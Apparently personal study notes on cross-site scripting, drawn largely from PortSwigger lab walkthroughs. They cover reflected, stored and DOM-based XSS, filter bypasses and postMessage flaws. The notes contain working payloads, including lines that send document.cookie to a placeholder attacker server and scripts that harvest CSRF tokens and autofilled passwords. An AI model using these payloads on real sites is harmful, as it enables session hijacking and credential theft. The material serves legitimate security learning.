# TODO: add a section for all HTML tags and how they could be used

then examples of everything.
instead of taking notes of all the payloads and all, add them to a automation and take note of the philosophy.


[[XSS html tags]]
# `script`


* inline script: embedded in the html
* loaded from separate files `<script src="URL_OF_EXTERNAL_SCRIPT"></script>`

example: 

if the attacker injects this code in victim's browser, unpon visiting, victim
sends a GET request to the attacker's machine:

```js
<script>image = new Image();image.src='http://attacker_server_ip/?c='+document.cookie;</script>
```

## HUNT

* check for reflected user input
* look for scripts
* use console and debugger
* test every input
* send a combination of characters `abc ' " } < > ; // # - ()` to see how they are handled.

1. look for input opportunities:

* you might be able to edit the *request* parameters, even if there there isn't
  an input method on the website.

DOM or reflected:

* user input in URL parameters, fragments, pathnames that are displayed to the
  user.
* insert a custom string into each URL parameter and search the source code in
  the return page to see if it's reflected.

2. Insert payload:

* `<script>alert('XSS by Vickie');</script>` doesn't work on updated
  stuff.

* using event attributes:

`onload` : runs a script after the html element has loaded.
others: (`onclick`, `onerrorr`) 

* using  `<img>` tags:

`<img onload=alert('the image has been loaded!') src="example.png">`

* special URL schemes:

`javascript:alert('XSS by Vickie)` like: `<iframe src=javascript:alert(1)>`

`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"`
the same alert in base64 to bypass filters.

* iframe

more test:

Insert a string of special HTML characters often used in XSS payloads, such as
the following: >'<"//:=;!--. Take note of which ones the application escapes
and which get rendered directly. Then you can construct test XSS payloads from
the characters that you know the application isn’t properly sanitizing.

BLIND XSS:

try making the victim’s browser generate a request to a server you own:
`<script src='http://YOUR_SERVER_IP/xss'></script>`
If you see a request to the path /xss, a blind XSS has been triggered!

----

# defenses against XSS

* regex to ban script tags
* CSP ([[content security policy]]) rules

monitoring the input:
* validating: whether it's malicious
* sanitizing: changes part of it before further processing

POC:
`<script>alert('XSS by Vickie');</script>`

# XSS

taking advantage of web applications executing scripts on user's browsers.

finding the functionalities where user changes some part of the applications
code that is then executed (dynamic scripts), then changing it.

allows an attacker to:
  * compromise the interactions that users have with a vulnerable application
  * circumvent the same origin policy
  * masquerade as a victim user, to carry out any actions that the user is
 able to perform

Occur as a result of improperly sanitized user input being embedded in the UI/ DOM.

XSS attacks can obtain any type of data present in the current web application.

## XSS types:

  * Stored: the malicious script is first stored in the website's database, then
  executed. (in database)
  
  * Reflected: the malicious script originates from the current HTTP request
  reflected by a server. (in request and reflected by server)
	
  * DOM-based: the vulnerability exists in client-side code (the browser) and is executed there. (stored and executed in the browser)

## stored:

app receives data, stores it in the database and and unsafely includes it in
it's *later* HTTP response.

EX: 

1. if this payload is embedded in a comment, victim just have to visit the page.

`<script>alert('hacked');</script>`

or it could be in a request:
`postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net`

2. if there is an XSS payload in the title of a video or article in the front page of the site, it would effect people visiting it.
	
### examin

test all relevant *entry points* and all *exit points*

  * Entry points:
    * Parameters or other data within the URL query string and message body.
    * The URL file path. 
    * HTTP request headers
    * out-of-band routes via which an attacker can deliver data into the application:
      * emails into a webmail app
  
  * exit points:
    * all possible HTTP responses (to any kind of application user in any situation)
    * audit logs (visible to some application user)

locate the links between entry and exit points.

  * work through entry points, submit a specific value into each one, and monitor
    the apps responses where the submitted values appears.
    
    Determine if the observed value is stored in different request or simply reflected.

test for a vulnerability:

  * determine the context within the response where the stored data appears and test appropriate payloads.

  with the same methodology as reflected XSS.
## reflected:

app receives an http request and includes the data in it's *immediate* response.

processed in the server, returned to the user without being stored in the
database.

EX:

1. the page relies on the user input to construct the page, e.g. on displaying
search results.

`https://example.com/search?q=<script>alert('hacked');</script>`

2. `https://insecure-website.com/status?message=All+is+well`
results `<p>Status: All is well.</p>`

EXPLOIT:

* send a malicious link and somehow send it to the victim (via email, or ad for example)
* placing links on a website controlled by attacker.

### examin

test every entry point within http requests:
  * parameters
  * URL :
    * query string
    * message body
    * file path
  * http headers

submit random values:
  * determine if it's reflected in the response
  * it should be short and only alphanumeric to survive input validations

determine the reelection context (where is it reflected):
  * between html tags
  * within a quoted tag attribute
  * a JavaScript string
  or ...

test a payload:
  * based on the context
  * to trigger JavaScript execution
  * keep the random value, then insert the payload before or after it, so you
    can find it by searching the random value.
    * `<script>alert(1)</script>abc123xyz`, `abc123xyz<script>alert(1)</script>`


## DOM-based cross-site scripting:

Document object model, is the method browsers use to render a web page;
  * which elements should be where
  * elements have their own properties
  * stuff are manipulated with JS.

`var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;`

when a website contains JavaScript that takes an attacker-controllable value,
known as a *source*, and passes it into a dangerous function, known as a *sink*.

the main source for DOM XSS is the URL (accessed by `window.location` obj),
some of the others: `location.search document.referrer document.cookie`

attackers attack the Dom when a page takes user input and alters the Dom based
on that input.

not all sources work with every sinks:

innerHTML() extracts the html contents of an element.
and doesn't accept script; so use img, onload, onerror.
when an application contains some client-side JavaScript that processes data
from an untrusted source in an unsafe way.

### examine

#### test html sinks

place a random alphanumeric string in to the source.

use developer tools to inspect and find where the string appears.

refine your input based on the context of where your string appears in the DOM.
e.g. if your string is inside a double quoted attribute, use double quote in
your string to try to break out of it.

* if your data gets URL encoded before being process, then an XSS attacks is
  unlikely to work.

#### test JavaScript execution sinks

your input doesn't appear in the DOM.

find cases in the page's JavaScript code where *source* is referenced.

use the JavaScript debugger to add a breakpoint and follow hot the source is used. 

see if the source or it's values or a variable pointed to it are passed to a sink.

found a sink? hover over the variable to see it's value. refine the input to
see if you can do a successful attack.

### DOM XS with different sources and sinks

#### `document.write` sink using source `location.search`

`document.write('... <script>alert(document.domain)</script> ...');`

payload:

`/?search=smn123"><script>alert('XSS+by+Vickie')%3B<%2Fscript>`

result in the code:

`<img src="/resources/images/tracker.gif?searchTerms=smn123" pv5p3atqt="">
<script>alert('XSS by Vickie');</script>`

* if you need to close the `<select>` tag, use `</select>`:

  `/product?productId=1&storeId=smn12</select><script>alert("q")</script>`

#### `innerhtml` sink using source `location.search`

`innerhtml` doesn't accept `script` or `svg onload`, use `img` or `iframe`.

the script that uses `innerhtml`:

`function doSerachQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}`

payload: `</span><img src=1 onerror=alert(document.domain)>`

### Sources and sinks in third-party dependencies

#### jQuery anchor `href` attribute sink using `location.search` source

third party frameworks introduce new sources and sinks:

Selectors are used to find html elements based on their names and more; and
allowing  you to manipulate elements; e.g. `$()`.

`attr()` method sets or returns attributes and values of the selected elements.

selects an element and returns it's attribute:
`$(selector).attr(attribute)` -> `$("a").attr("href")`

`https://0a99001c0357321a81887acb00d8006d.web-security-academy.net/feedback?returnPath=/`

and there is this code in the page which sets whatever is in `returnPath` in
the `herf` of `backLink`:
  
`(function() {
$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});`

`href` is used for redirection, so we use a payload with `javascript`.

payload:

`javascript:%20alert(document.cookie)` so `https://0a99001c0357321a81887acb00d8006d.web-security-academy.net/feedback?returnPath=javascript:%20alert(document.cookie)`

result:

`<a id="backLink" href="javascript: alert(document.cookie)">Back</a>`

#### jQuery `selector` sink using a `hashchange` event

`$() selector function, can be used to inject malicious objects into the DOM. `

`hash` is user controllable and could be used to inject into the `$()`.

`hashchange` event handler: on `hashchange`, performs the following function; uses
a *selector* to find the given fragment, then scrolls to it.
you should send the exploit to the victim so that it triggers a `hashchange` event, when it's loaded.

`$(window).on('hashchange', function() {
  var element = $(location.hash);
  element[0].scrollIntoView(); });`

trigger a `hashchange` event without user interaction:

`<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`
changes the fragment on load, activating a `hashchange` event, then the selector adds it to the DOM. (see the function below

#### AngularJS expression with angle brackets and double quotes HTML-encoded:

* if it has `ng-app` (directive)  somewhere: then it's using angular, so you
  can run js inside {{}}. so, sending {{1+1}}, returns 2.

  but something like this: {{alert()}} doesn't work, perhaps because there is some
  protections.

  using this, in the search box with angle bracket encoded: `{{$eval.constructor('alert(1)')()}}`
  * the `()` in the end, call the function we defined before it.
  * more on how this works `https://www.youtube.com/watch?v=QpQp2JLn6JA`

`<script>
    var searchTerms = '';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>`

#### Reflected DOM XSS

a type of DOM that goes to the server and back.

pure DOM XSS (a script reads data -from the URL or other client side sources-
and writes it to a sink) is an entirely client-side issue, payload inserted into the page.

reflected XSS is a server-side issue, payload reflected into the HTML.

sources can also get data from the website (not just browser)

website reflect URL parameters in serve's HTML responses (happens in normal XSS)

RDXSS: attack vector is client side, interacts with the server then is inserted
into the DOM:
  
  * server processes the request
  * echoes the data into the response
  * the data might be placed into a *JavaScript string literal* or a *data item
    in the DOM*
  * a script writes the data into a *sink*

* `eval()` function evaluates JavaScript code represented as a string and
  returns its completion value.

  `'var searchResultsObj = ' + this.responseText`

how to:

use network tab in chrome inspector tool (or burp) to see the requests made to the
server after submitting the input.

the response could be different based on the server's actions.

in this case, it's a `JSON` object:
`{"results":[],"searchTerm":"<script>alert(1);</script>"}`

payload: `\"}-alert(1) //`


backslash is there to escape the backslash the server puts to comment the double quote.
`
\\
`
to comment out the rest.

result:

`{"results":[],"searchTerm":"\\"}-alert(1) // {\\""}`

the suggested payload: `\"-alert(1) }//`
the result:
`{"results":[],"searchTerm":"\\"-alert(1) }//"}`

#### Stored DOM XSS

* server receives data from one request
* stores it
* later includes it in a response
* A script in the later response contains a *sink*

if you entered some html character (< e.g.) and it's shown in the output, then
it is encoded successfully and otherwise.

payload: `<><img src=1 onerror=alert()>`

result:

`<p>&lt;&gt;<img src="1" onerror="alert()"></p>`

the stuff were inside a `p` tag in the first place.

the second `<p>`'s `<>` are encoded:
`  function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }`

### XSS between HTML tags

When the XSS context is text between HTML tags, you need to introduce some new
HTML tags designed to trigger execution of JavaScript.

`<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>`

#### Reflected XSS into HTML context with most tags and attributes blocked

test process:

trying html tags and they get filtered:
`<img src=1 onerror=print()>`

`<>` aren't filtered.

How to figure allowed tags? by bruteforcing, burp intruder is easy.
if it's filtered, we get 400. 200 is a win.

`<body>` isn't filtered.

some attributes are filtered.

bruteforcing attributes too.

`GET /?search=<body%20$=1> HTTP/2`

the `$` will be bruteforced.

how to envoke the attack without user interaction:

but we can't use `onload`. or can we?

solution? run the page inside an `iframe`, on an attacker controlled page.
we can resize the iframe on page load and the XSS will be executed automatically.

it needs that the victim to visit the attacker controlled page.

`<iframe
src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
onload=this.style.width='100px'>`

the iframe being resized as soon as it's loaded, triggering `onresize` events.

#### just custom tags allowed

trying:

`<script>
<h1>`
don't work.

`<custom-tags>` works
and we see it reflected in page's html.

and then this gives us an alert:
`<custom-tags onmouseover="alert()">`

how to make it automatic (user doesn't have to do anything (mouseover))?

`<custom-tags id="x" onfocus="alert(document.cookie)" tabindex="1">`

`onfocus`: using tab or mouse click, e.g. you will see a cursor indicating
you can type there.
and might even be true on none inputting elements. if they have `tabindex="1"`

`id="x"`: focus on a specific element (bookmarking, `hashchange`?).

so at the end: if we append `#x` to the page that contains the payload, it will
be focused on it and alerted:

`/?search=<custom-tags id="x" onfocus="alert(document.cookie)" tabindex="1">#x`

how to use js to redirect the victim's browser to the desired url?

if the victim visits an attacker controlled domain, the attacker can run js on
his browser, redirecting him to the URL.

`<script>
location="https://0a37005b03aa29a384e1193d0017008a.web-security-academy.net/?search=%3Ccustom-tags+id%3D%22x%22+onfocus%3D%22alert%28document.cookie%29%22+tabindex%3D%221%22%3E/#x"
</script>`

#### Reflected XSS with event handlers and href attributes blocked

first brute forcing to see tags and events available:

`svg` tag is available:

The svg element is a container that defines a new coordinate system and
viewport and is used to create and display graphics on the web.

trying:
`<svg width="200" height="200">
    <a>
       <text>Click me</text>
    </a>
</svg>`

If text is included in SVG not inside of a `<text>` element, it is not rendered.

`<svg><a><text x=20 y=20>Click me</text></a></svg>`
having x,y helps to actually display the text. 

`svg` accepts an `<animate>` element which could be used to set attributes.
`<svg><a><animate attributeName="href" values="javascript:alert()"></animate><text x=20 y=20>Click me</text></a></svg>`

#### Reflected XSS with some SVG markup allowed

test a typical payload: `<img src=1 onerror=alert(1)>`

bruteforce tags.

`?search=<$$>`

there is an SVG and elements we can put inside it.

bruteforce for events.

`?search=<SVG><animateTransform%20$$=1>`

`onbegin` is found

payload: `<svg><animateTransform onbegin="alert()"></animateTransform></svg>`

#### encoded

```
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```

with angle brackets encoded:
this: `https://0a2a0022043296d88235b085003d00fa.web-security-academy.net/?search=%3Cscript%3Ealert%28%27XSS+by+Vickie%27%29%3B%3C%2Fscript%3E`
will cause this: `<input type="text" placeholder="Search the blog..." name="search" value="" &lt;script&gt;alert('xss="" by="" vickie');&lt;="" script&gt;i">`

a payload without angle brackets: `/?search="onmouseover="alert(1)`: 
<input type="text" placeholder="Search the blog..." name="search" value="" onclick"alert(1)">

also this: <a id="author" href="javascript:alert(1)">test</a>

#### Lab: Reflected XSS in canonical link tag


websites could encode angle brackets but you could still inject attributes.

*canonical link* is a tag in the source code of a page that indicates to search
engines that a master copy of the page exists, to avoid confusion on duplicate
documents.

*access keys* allow to provide keyboard shortcut that when pressed will cause
an event to fire.

this is the canonical link in the code:

`<link rel="canonical" href='https://0aba0085031513cc809f1c7200380018.web-security-academy.net/'>`

it's easy to inject something like `onclick=alert()` but we won't be able to
see it because it inside the `head` tag. we should use `accesskey`.

payload: `/?' accesskey='Alt+x' onclick='alert()`

### XSS into JavaScript

the `<script>` tags are executed after the browser is done with html parsing
and identifying page elements, so breaking the `<script>` doesn't break our payload.


#### closing the `script` tag

`</script><script>alert(1)</script>`

#### breaking out of a JavaScript string

`<script>
var searchTerms = '123';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>`

say we add this: `123'; alert();` it won't execute, because there will be an
excess `'` left which breaks the code: `'123';alerr();';...`

but this: `123'; alert(); let var = 'test` works.

Payload: `'-alert()-'`

result: `var searchTerms = ''-alert()-'';`

#### single quotes escaped

`';alert(document.domain)//` is converted to `\';alert(document.domain)//`

`\';alert(document.domain)//`, escapes the backslash: `\\';alert(document.domain)//`

#### with some characters blocked

characters could be restricted, on the website or a firewall blocking the
request.

what could we do: experiment with other ways (rather than `()` or other blocked
stuff.) of calling functions.

e.g. use `throw` with exception handler:

`onerror=alert;throw 1`

Assigns `alert()` to global exception handler, then `throw 1`, passes 1 to the
exception handler (throws an error?).

`https://portswigger.net/research/xss-without-parentheses-and-semi-colons`


payload:
`post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`


`throw` returns the last value in the comma separated list:

`throw/**/onerror=alert,1337`

  * `onerror` is JavaScript's error handler.
  * `onerror=alert` assigns alert() to `onerror`, overwriting `error()` to do
    `alert()`
  * the error is going to throw the value `1337`.
    we won't have `uncought` (default error handler behaviour) but `1337` alerted.

`x=x=>{throw/**/onerror=alert,1337}`

  * an arrow function:

    we can't write it like `x=()=>` as it's supposed to be written because `()` will be blocked,so: `x=x=>`.

    also no spaces, it's going to break the url.

  * now the `throw` is inside the function, so it happens if it's called.

`toString=x`

  * it's default behaviour is to convert a data type to string.
  * but now `toString` is the function `x`.
  * so whenever JavaScript calls `toString` it's going to call `x`.

`window+""`

  * string concatenation, so `toString` is used by JavaScript.

the js code to be injected in:
`<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4'}).finally(_ => window.location = '/')">`

`fetch`: dispatching http requests and manipulating response, the url is `/analytics` and other http request data.

we are inside the configuration options object of the `fetch` method and we should break out and add another option to the `fetch` API.

with our payload we send three argument instead of two to `fetch`, but it doesn't consider the excess, but we can use it to assign a value to a variable.

* `&`: in browser term: the next key value pair. it allows the page to
  continue working.

* `/**/` we can't inject spaces, but it's needed.

### use of HTML-encoding

when the XSS context is an existing JavaScript within a quoted tag attribute,
we can use HTML-encoding to bypass some filters.

When the browser has parsed out the HTML tags and attributes, it will perform
HTML-decoding of tag attribute.

#### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

`<a id="author" href="http://test.com" onclick="var tracker={track(){}};tracker.track('http://test.com');">t</a>`

if there isn't a single quote, it won't be escaped.
payload: `http://test.com&apos;-alert(document.domain)-&apos;`

#### JavaScript template literals

js template literals are string literals that allow embedded js expressions:

`<script>
var message = `0 search results for '123'`;
document.getElementById('searchMessage').innerText = message;
</script>`

use `${}` to embed as expression to be executed: `${alert()}`

`var message = `0 search results for '${alert()}'`;`

## exploiting XSS

### to steal cookies

exploit it to send victim's cookies to your domain.
to do this we should make the browser to send and http requests.

it has limitations:
  * victim not logged in
  * cookies hidden from js by `HttpOnly`
  * ...

but how to make user send an http request?

payload:

```js
<script>

window.addEventListener('DOMContentLoaded', function() {

var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();

data.append('csrf', token);
data.append('postId', 8);
data.append('comment', document.cookie);
data.append('name', 'victim');
data.append('email', 't@t');
data.append('website', 'http://test.com');

fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});
});
</script>
```

will be used so that the person visiting the site, comments his token.


### to capture passwords

password managers autofill passwords.

the idea is to create a password input, reading the auto-filled password and
send it to our domain.

```js
<input type="txt" name="username">
<input type="password" name="password" onchange="hax()">

<script>

function hax() {
var token = document.getElementsByName('csrf')[0].value;
var username = document.getElementsByName('username')[0].value;
var password = document.getElementsByName('password')[0].value;


var data = new FormData();

data.append('csrf', token);
data.append('postId', 8);
data.append('comment', `${username}:${password}`);
data.append('name', 'victim');
data.append('email', 't@t');
data.append('website', 'http://test.com');

fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});
}
</script>
```

### sending csrf to another destination:

`fetch('destination', {
...
});`

## DOM based manipulation

### web messages can be used as a source

If a page handles incoming web messages in an unsafe way, for example, by *not
verifying the origin of messages* correctly in the event listener, properties
and functions that are called by the event listener can potentially become
sinks.

#### DOM XSS using web messages

`<script>
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
</script>`

Payload: `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`

`postMessage()` enables cross-origin communication between Window objects;
between a page and a pop-up that it spawned, or between a page and an iframe.

it sends a `message` *event* to the specified window: `window.postMessage(message)`

`contentWindow` property returns the Window object of an HTMLIFrameElement.

in the case of this payload:

`'*'` is used as the target origin, which means that the message can be
received by any domain.

`postMessage()` sends a web message to the home page. the event listener adds
it to the DOM.

#### using JavaScript URL

JS URL `javascript:`

<script>
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
</script>

`onload="this.contentWindow.postMessage('javascript:print()//http:','*')"`

comments (//) can be used to mask or bypass URL validation.

the script above is vulnerable, so if we have http anywhere in the payload, it
will be sent to the location.href. but there, that part of the payload
containing http is considered to be commented.

### Origin verification

origin verifications could be flawed.

`indexOf()`, `startWith()`, `endsWith()` methods are unsafe.

#### 

```js
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }
    switch(d.type) {
        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
}, false);
```

when `case` is "load-channel" is interesting.

`<iframe src=https://0a9700d40387d3bc82b4ab24000600c3.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`

#### cookie manipulation

Some DOM-based vulnerabilities allow attackers to manipulate data that they do
not typically control. This transforms normally-safe data types, such as
cookies.

An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary value in the user's cookie.

`<script>
document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>`

`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">`

e iframe loads for the first time, the browser temporarily opens the malicious
URL, which is then saved as the value of the lastViewedProduct cookie. The
onload event handler ensures that the victim is then immediately redirected to
the home page.

* When the iframe is first loaded, window.x is undefined (or not set), so the
  condition if(!window.x) evaluates to true.
* The src of the iframe is immediately changed (or reloaded) to the specified
  URL ('https://YOUR-LAB-ID.web-security-academy.net'), triggering a second
  load of the iframe.
* After reloading, window.x is now 1, so the next time the onload event fires,
  the if(!window.x) condition will be false, preventing further reloads.

### DOM clobbering

inject HTML into a page to manipulate the DOM and ultimately change the
behavior of JavaScript on the page. useful in cases where XSS is not possible,
but you can control some HTML on a page where the attributes id or name are
whitelisted by the HTML filter.

The most common form of DOM clobbering uses an anchor element to overwrite a
global variable, which is then used by the application in an unsafe way.

## general TEST:

submit some simple unique input into every entry point in the application,
identify every location where the submitted input is returned in HTTP responses
or DOM, and testing each location individually to determine whether suitably
crafted input can be used to execute arbitrary JavaScript.

* add simple obvious inputs at first, `<>`, html tags, hello world, whatever.

## to get user's data by XSS:

for example user's cookies, you could redirect them to your server.
this is actually straight forward:
`<scirpt>document.location=<yourServer>+document.cookie</script>`

then after we take the user's cookie, we will simply add it into a request to the account.

* you can use `john the ripper` to find the hashed values and specify the algorithm using: `--format=raw-md5`
